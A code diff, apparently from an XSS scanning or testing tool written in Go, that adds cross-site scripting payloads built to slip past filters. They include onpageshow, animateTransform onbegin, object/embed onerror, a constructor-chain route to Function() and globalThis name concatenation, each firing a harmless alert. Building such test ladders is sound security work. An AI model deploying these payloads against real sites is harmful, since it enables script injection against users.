@@ -55,6 +55,16 @@ func htmlTextExecLadder() []xssExecPayload {
 		{`<iframe srcdoc="&lt;script&gt;` + xssAlert + `&lt;/script&gt;">`, "iframe", "srcdoc"},
 		{`<iframe srcdoc="&lt;svg onload=` + xssAlert + `&gt;">`, "iframe", "srcdoc"},
 		{`<svg><set attributeName=x to=y onbegin=` + xssAlert + `>`, "set", "onbegin"},
+		// onpageshow fires on every load (including back/forward-cache restores) —
+		// an alternative load event for filters that block onload by name.
+		{`<body onpageshow=` + xssAlert + `>`, "body", "onpageshow"},
+		// animateTransform is a distinct SVG animation element from <animate>/<set>,
+		// so a tag/handler allowlist tuned to those still misses onbegin here.
+		{`<svg><animateTransform onbegin=` + xssAlert + ` attributeName=transform dur=1s>`, "animatetransform", "onbegin"},
+		// error handler on <object>/<embed> — plugin-element load-failure vectors a
+		// media-tag-only allowlist does not cover.
+		{`<object onerror=` + xssAlert + ` data=x>`, "object", "onerror"},
+		{`<embed src=x onerror=` + xssAlert + `>`, "embed", "onerror"},
 		// ── auto-focus vectors (fire without a mouse) ──
 		{`<input autofocus onfocus=` + xssAlert + `>`, "input", "onfocus"},
 		{`<select autofocus onfocus=` + xssAlert + `>`, "select", "onfocus"},
@@ -95,6 +105,12 @@ func htmlTextExecLadder() []xssExecPayload {
 		// contains the word "alert" at all, only inside a string literal argument.
 		{`<svg onload=Function('alert(document.domain)')()>`, "svg", "Function("},
 		{`<svg onload=setTimeout('alert(document.domain)')>`, "svg", "setTimeout("},
+		// Constructor-chain: reach Function() through an array method's .constructor
+		// with no literal "Function"/"eval"/"alert(" call token in the source —
+		// defeats a filter that blocks all of those names.
+		{`<svg onload=[]["filter"]["constructor"]('alert(document.domain)')()>`, "svg", "onload"},
+		// globalThis/self indirection for filters anchored on "window.".
+		{`<svg onload=globalThis['ale'+'rt'](document.domain)>`, "svg", "onload"},
 		// ── mutation XSS (mXSS): the browser's own re-parsing behavior — not a
 		// string trick — turns "inert" markup into a live element. <noscript> is
 		// parsed as RAW TEXT only when the scripting flag is enabled (an ordinary
